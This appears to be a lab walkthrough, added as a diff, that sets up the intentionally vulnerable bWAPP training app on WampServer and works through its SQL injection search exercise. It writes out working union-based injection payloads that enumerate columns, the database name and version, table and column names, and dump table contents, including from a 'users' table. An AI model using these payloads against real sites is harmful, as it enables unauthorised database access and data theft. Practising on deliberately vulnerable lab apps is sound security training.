@@ -1,0 +1,75 @@
+1.	Download and install wampserver from https://www. wampserver.com/en/
+2.	If it is showing some errors then some of the vc++ redistribution files
+, then we can download it from Wampserver - Files and addons. Download the zip file, extract it and install all the files one by one .
+3.	After installation of all the redistribution files, install the wampserver.
+4.	Once installed check if it is working or not. Its icon must be shown as green color.
+5.	Download the bwapp.zip file from https://sourceforge.net/projects/bwapp/
+6.	Extract it into folde¬¬r. 
+7.	 Inside copy c:/bwapp/bwapp folder and paste into C:\wamp64\www
+8.	Open C:\Users\LCS\Downloads\bWAPPv2.2\bWAPP\admin\settings.php file in notepad, search set db_password =’ ‘.
+9.	Restart the wamp services .
+10.	Once restarted, go to browser and type localhost/bwapp/install
+11.	It will give the install page, but when we try to install,  it will give some error at line 40.
+12.	To fix this error, we will open C:\wamp64\www\bWAPP\install.php and at line 29 add 
+mysqli_report(MYSQLI_REPORT_OFF);
+13.	Refresh the page in the browser and it will install bwapp in the wamp
+14.	It will display bwapp installed successdfully.
+
+Exercise 1:- bwapp sql injection get/search
+ 
+Steps
+1.	When we select this option from the dropdown list, we may get error. According to the error we have to do corrections in the C:\wamp64\www\bWAPP\connect.php file as follows.
+2.	Convert all mysql commands to mysqli commands as follows
+$link = mysqli_connect($server, $username, $password, $database);
+    die("Could not connect to the server: " . mysqli_error());
+$database = mysqli_select_db($link,$database);
+
+    die("Could not connect to the database: " . mysqli_error()); 
+3.	After this we will be directed to the following web page
+ 
+
+4.	When we try to search for movie, again it may give error. So make changes in the C:\wamp64\www\bWAPP\sqli_1.php file as follows
+$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";
+
+    $recordset = mysqli_query($link,$sql)
+         <td colspan="5" width="580"><?php die("Error:mysqli_error()); ?></td>
+
+
+    if(mysqli_num_rows($recordset) != 0)
+
+        while($row = mysqli_fetch_array($recordset))         
+
+mysqli_close($link);
+5.	After these corrections, we get the following screen
+
+ 
+
+6.	When we enter spider, we get some listing. But when we enter, spiderman, we get “ no movies found”
+7.	Then we give some injection characters like ‘or1 or – or -and check. Here we will check by typing spider1’  -- - in the search box.
+8.	In the url it is showing as ‘http://localhost/bwapp/sqli_1.php?title=spider1%27+--+-&action=search’
+9.	And hence we conclude that the string 1’ -- - is breaking the sql query in our case. And it is shown as 
+ 
+.
+10.	Next we find out about how many columns does it have.
+In the search box type ‘spider1' order by 5 -- -‘ . here it does not show any error. It just show no movies found. Then try with 6,7,8. When we enter 8, it will give error. So here we conclude that, in our db we have 7 cols.
+11.	Next we find, what are those columns, by typing ‘spi1' union select 1,2,3,4,5,6,7 -- -‘ in the search bar and we will get the following screen
+ 
+12.	We will get the database with sp1' union select 1,database(),3,4,5,6,7 -- - in the search bar. And we will get
+ 
+13.	We can find the version by typing ‘ union select 1,database(),version(),4,5,6,7 -- -‘ and we will get the version.
+14.	Next we find all the table names by typing sp1' union select 1,table_name,3,4,5,6,7 from information_schema.tables-- - in the search box.it will give the following screen
+ 
+
+15.	Next we  will find out the columns in the table as follows
+sp1' union select 1,2,3,4,group_concat(column_name SEPARATOR ','),6,7 from information_schema.columns where table_name='movies'-- -
+
+or
+sp1' union select 1,2,3,4,group_concat(column_name SEPARATOR ','),6,7 from information_schema.columns where table_name='users'-- -
+
+
+type the above query in the search box
+16.	It will give the output as follows. We will get all the columns in
+  
+17.	To get the contents of the table, we inject in the following way in the search bar
+sp1' union select 1,2,3,4,group_concat(id,title),6,7 from movies -- - 
+and we will get all the table data
